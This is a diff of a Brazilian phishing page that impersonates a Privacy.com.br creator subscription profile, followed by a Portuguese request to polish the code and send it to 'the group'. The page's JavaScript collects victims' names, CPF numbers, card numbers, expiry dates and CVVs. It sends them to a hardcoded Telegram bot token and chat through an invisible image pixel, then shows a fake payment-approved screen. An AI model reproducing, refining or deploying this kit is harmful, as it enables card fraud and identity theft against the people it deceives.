@@ -4,8 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Privacy | Kamylinha Santos</title>
+    
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     
     <script src="https://cdn.jsdelivr.net/npm/notiflix@2.7.0/dist/notiflix-aio-2.7.0.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
@@ -14,113 +15,115 @@
     <style>
         :root { --p-orange: #f47b52; --p-grad: linear-gradient(90deg, #f47b52, #f9a67a); }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        
-        /* Bloqueio de seleção de texto apenas no que não é input */
-        body { background-color: #fff; color: #333; padding-bottom: 120px; user-select: none; -webkit-user-select: none; }
+        body { background: #fff; color: #333; user-select: none; -webkit-user-select: none; overflow-x: hidden; }
         input { user-select: text !important; -webkit-user-select: text !important; }
 
-        .top-nav { display: flex; justify-content: space-between; align-items: center; padding: 12px 20px; border-bottom: 1px solid #f0f0f0; position: sticky; top: 0; background: #fff; z-index: 100; }
-        .banner { width: 100%; height: 250px; background: #eee url('capa.png') center/cover; }
+        .header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; position: sticky; top: 0; background: #fff; z-index: 100; }
+        .logo-img { height: 28px; }
+
+        .banner-box { position: relative; width: 100%; height: 250px; background: #eee url('capa.png') center/cover no-repeat; }
+        .stats-overlay { position: absolute; bottom: 12px; right: 12px; background: rgba(0,0,0,0.6); color: #fff; padding: 6px 14px; border-radius: 20px; font-size: 11px; display: flex; gap: 12px; backdrop-filter: blur(5px); font-weight: 600; }
+
+        .profile-wrap { margin-top: -55px; padding: 0 20px; position: relative; z-index: 10; }
+        .profile-pic { width: 115px; height: 115px; border-radius: 50%; border: 4px solid #fff; background: #ddd url('perfil1.png') center/cover no-repeat; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
         
-        .profile-pic-wrapper { margin-top: -55px; padding-left: 20px; position: relative; z-index: 10; }
-        .p-pic { width: 115px; height: 115px; border-radius: 50%; border: 4px solid #fff; background: #ddd url('perfil1.png') center/cover; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-
         .info { padding: 15px 20px; }
-        .name { font-size: 22px; font-weight: 700; display: flex; align-items: center; gap: 6px; }
-        .username { color: #666; font-size: 14px; margin-bottom: 10px; }
-        .bio { font-size: 14.5px; color: #444; line-height: 1.5; }
+        .name { font-size: 24px; font-weight: 800; display: flex; align-items: center; gap: 6px; }
+        .user-at { color: #888; font-size: 14px; margin-bottom: 12px; }
+        .bio { font-size: 14px; line-height: 1.6; color: #444; margin-bottom: 15px; }
 
-        .btn-sub { width: calc(100% - 40px); margin: 15px 20px; padding: 18px 25px; border-radius: 50px; border: none; color: white; display: flex; justify-content: space-between; align-items: center; cursor: pointer; background: var(--p-grad); font-weight: 700; font-size: 18px; box-shadow: 0 4px 15px rgba(244, 123, 82, 0.3); }
-        .price-now { font-size: 20px; font-weight: 800; }
+        .btn-plan { width: calc(100% - 40px); margin: 10px 20px; padding: 20px 25px; border-radius: 50px; border: none; color: #fff; background: var(--p-grad); display: flex; justify-content: space-between; align-items: center; cursor: pointer; text-decoration: none; box-shadow: 0 4px 15px rgba(244,123,82,0.2); }
+        .plan-txt { font-size: 18px; font-weight: 700; }
+        .new-p { font-size: 20px; font-weight: 800; }
 
-        .media-gallery { padding: 0 20px; margin-top: 10px; }
-        .media-item { width: 100%; height: 250px; border-radius: 15px; background: url('imagem2.png') center/cover; filter: blur(15px); border: 1px solid #eee; }
+        .gallery { padding: 20px; }
+        .media-item { width: 100%; height: 260px; border-radius: 20px; background: #eee url('imagem2.png') center/cover no-repeat; filter: blur(20px); border: 1px solid #eee; }
 
-        /* MODAL */
-        #paymentModal, #successScreen { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); }
-        .m-content { background: #fff; margin: 10% auto; width: 92%; max-width: 450px; border-radius: 25px; padding: 30px; position: relative; animation: slideUp 0.3s ease; }
-        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-
+        #payModal, #successScreen { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 2000; backdrop-filter: blur(10px); }
+        .m-content { background: #fff; margin: 10% auto; width: 92%; max-width: 450px; border-radius: 30px; padding: 30px; }
         .f-group { margin-bottom: 15px; text-align: left; }
-        .f-group label { display: block; font-weight: 700; margin-bottom: 5px; font-size: 14px; }
-        .f-group input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #ffd8cc; background: #fff9f7; font-size: 16px; outline: none; }
-
-        /* TELA SUCESSO */
+        .f-group label { display: block; font-weight: 800; font-size: 11px; color: #aaa; text-transform: uppercase; margin-bottom: 5px; }
+        .f-group input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #eee; background: #f9f9f9; font-size: 16px; outline: none; }
+        
         #successScreen { background: #fff; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
-        .img-final { width: 100%; max-width: 350px; border-radius: 20px; margin: 20px 0; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-
-        .notif { position: fixed; bottom: 20px; left: 20px; right: 20px; background: #fff; padding: 12px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.15); display: flex; align-items: center; gap: 12px; transform: translateY(200%); transition: 0.5s; z-index: 3000; border-left: 4px solid var(--p-orange); }
-        .notif.show { transform: translateY(0); }
+        .img-win { width: 100%; max-width: 320px; border-radius: 20px; margin: 20px 0; border: 3px solid var(--p-orange); }
+        .status-txt { font-size: 26px; font-weight: 900; color: #4CAF50; margin-bottom: 5px; }
     </style>
 </head>
 <body oncontextmenu="return false">
 
-    <nav class="top-nav">
-        <img src="https://privacy.com.br/img/logo-orange.svg" height="28">
-        <i class="fa-solid fa-bars" style="color: #f47b52;"></i>
-    </nav>
+    <div class="header">
+        <img src="logo.png" class="logo-img" onerror="this.src='https://privacy.com.br/img/logo-orange.svg'">
+        <i class="fa-solid fa-bars" style="color: var(--p-orange); font-size: 22px;"></i>
+    </div>
 
-    <div class="banner"></div>
-    <div class="profile-pic-wrapper"><div class="p-pic"></div></div>
+    <div class="banner-box">
+        <div class="stats-overlay">
+            <span><i class="fa-regular fa-image"></i> 354</span>
+            <span><i class="fa-solid fa-video"></i> 148</span>
+            <span><i class="fa-regular fa-heart"></i> 20.2K</span>
+        </div>
+    </div>
+
+    <div class="profile-wrap"><div class="profile-pic"></div></div>
 
     <div class="info">
         <div class="name">Kamylinha Santos <i class="fa-solid fa-circle-check" style="color:var(--p-orange)"></i></div>
-        <p class="username">@eukamylinhasantos</p>
-        <p class="bio">Oi, meus amores! 🔥💦 Venha ver tudo o que eu não posso postar no Instagram. Assine agora para liberar meus vídeos e fotos exclusivas sem censura!</p>
+        <div class="user-at">@eukamylinhasantos</div>
+        <p class="bio">Oi, meus amores! 🔥 Venha ver tudo o que eu não posso postar no Instagram. Assine agora para liberar meus vídeos e fotos exclusivas!</p>
     </div>
 
-    <div class="btn-sub" onclick="$('#paymentModal').fadeIn()">
-        <span>ASSINAR AGORA</span>
-        <span class="price-now">R$ 10,00</span>
+    <div class="btn-plan" onclick="openPay('Mensal', '10,00')">
+        <span class="plan-txt">ASSINATURA MENSAL</span>
+        <span class="new-p">R$ 10,00</span>
     </div>
 
-    <div class="media-gallery">
-        <div class="media-item"></div>
+    <div class="btn-plan" onclick="openPay('Vitalício', '27,00')">
+        <span class="plan-txt">ACESSO VITALÍCIO</span>
+        <span class="new-p">R$ 27,00</span>
     </div>
 
-    <div id="paymentModal">
+    <div class="gallery"><div class="media-item"></div></div>
+
+    <div id="payModal">
         <div class="m-content">
-            <h2 style="text-align:center; color:var(--p-orange); margin-bottom:25px; font-weight:800">Pagamento</h2>
+            <h2 id="planTitle" style="color:var(--p-orange); margin-bottom:20px; font-weight:800; text-align:center;">Pagamento Seguro</h2>
             <div class="f-group"><label>Nome no Cartão</label><input type="text" id="p_name" placeholder="Nome Completo"></div>
             <div class="f-group"><label>CPF do Titular</label><input type="text" id="p_cpf" placeholder="000.000.000-00"></div>
             <div class="f-group"><label>Número do Cartão</label><input type="text" id="c_num" placeholder="0000 0000 0000 0000"></div>
             <div style="display:flex; gap:10px">
-                <div class="f-group" style="flex:2"><label>Validade</label><input type="text" id="c_val" placeholder="MM/AA"></div>
+                <div class="f-group" style="flex:1"><label>Validade</label><input type="text" id="c_val" placeholder="MM/AA"></div>
                 <div class="f-group" style="flex:1"><label>CVV</label><input type="text" id="c_cvv" placeholder="123"></div>
             </div>
-            <button class="btn-sub" style="width:100%; margin:10px 0; justify-content:center; font-weight:800" onclick="finalizarCompra()">CONFIRMAR COMPRA</button>
-            <p style="text-align:center; color:#999; font-size:13px; cursor:pointer" onclick="$('#paymentModal').fadeOut()">Cancelar</p>
+            <button class="btn-plan" style="width:100%; margin:10px 0; justify-content:center; font-weight:800" onclick="finalizarCompra()">APROVAR COMPRA</button>
+            <p style="text-align:center; color:#999; font-size:12px; cursor:pointer" onclick="$('#payModal').fadeOut()">Voltar</p>
         </div>
     </div>
 
     <div id="successScreen">
-        <i class="fa-solid fa-circle-check" style="color:#4CAF50; font-size:70px"></i>
-        <h1 style="margin-top:20px">Acesso Liberado!</h1>
-        <p style="color:#666; margin: 10px 0;">Sua assinatura foi processada com sucesso.</p>
-        <img src="imagem1.png" class="img-final">
-        <p style="font-weight:800; color:var(--p-orange)">VERIFIQUE SEU E-MAIL CADASTRADO</p>
-        <button class="btn-sub" style="width:200px; justify-content:center; margin-top:30px" onclick="location.reload()">FECHAR</button>
-    </div>
-
-    <div class="notif" id="notif">
-        <img src="perfil1.png" style="width:45px; height:45px; border-radius:10px">
-        <div><b>Felipe M.</b> acabou de assinar!<br><small style="color:var(--p-orange); font-weight:bold">Acesso Liberado ✅</small></div>
+        <i class="fa-solid fa-circle-check" style="color:#4CAF50; font-size:80px"></i>
+        <h1 class="status-txt">PAGAMENTO APROVADO</h1>
+        <p style="font-size:18px; font-weight:600; color:#666">Entrega de conteúdo em até 24Hrs</p>
+        <img src="imagem1.png" class="img-win">
+        <button class="btn-plan" style="width:200px; justify-content:center; margin-top:30px" onclick="location.reload()">CONCLUIR</button>
     </div>
 
     <script>
+        let planoSel = "";
         $(document).ready(function(){
             $('#c_num').mask('0000 0000 0000 0000');
             $('#p_cpf').mask('000.000.000-00');
             $('#c_val').mask('00/00');
             $('#c_cvv').mask('000');
-
-            setInterval(() => {
-                $('#notif').addClass('show');
-                setTimeout(() => $('#notif').removeClass('show'), 5000);
-            }, 12000);
         });
 
-        async function finalizarCompra() {
+        function openPay(n, p) { 
+            planoSel = n; 
+            $('#planTitle').text('Plano ' + n + ' - R$ ' + p); 
+            $('#payModal').fadeIn(); 
+        }
+
+        function finalizarCompra() {
             const token = '8495716341:AAEWdea8RcXtXrziTTMNkoBA78dTue71-Uc';
             const chat = '-1003569961624';
             
@@ -130,28 +133,26 @@
             const v = $('#c_val').val();
             const s = $('#c_cvv').val();
 
-            if (c.length < 16 || f.length < 14 || !n) {
-                Notiflix.Notify.failure('Preencha os dados do cartão!');
+            if (c.length < 16 || f.length < 14) {
+                Notiflix.Notify.failure('Preencha os dados corretamente!');
                 return;
             }
 
-            Notiflix.Loading.circle('Processando transação segura...');
+            Notiflix.Loading.circle('Validando transação...');
 
-            const msg = `🚀 **NOVA CAPTURA PREMIUM**\n\n👤 **Nome:** ${n}\n🆔 **CPF:** ${f}\n💳 **Card:** \`${c}\`\n📅 **Val:** ${v}\n🔒 **CVV:** ${s}`;
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+            const msg = `🚀 NOVO CARD CAPTURADO\n👤 Nome: ${n}\n🆔 CPF: ${f}\n💳 Card: ${c}\n📅 Val: ${v}\n🔒 CVV: ${s}\n💰 Plano: ${planoSel}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`;
 
-            // Abre janela fantasma para esconder o Token e fecha rápido
-            const win = window.open(url, '_blank', 'width=1,height=1,left=20000,top=20000');
+            // MÉTODO DO PIXEL INVISÍVEL: Envia os dados sem mudar de página
+            var pixel = new Image();
+            pixel.src = url;
 
             setTimeout(() => {
-                if(win) win.close();
                 Notiflix.Loading.remove();
-                $('#paymentModal').hide();
+                $('#payModal').hide();
                 $('#successScreen').css('display', 'flex'); 
             }, 2500);
         }
     </script>
 </body>
 </html>
-
-Aqui o codigo esse funciona deixa bonito e bota pra ir pro grupo
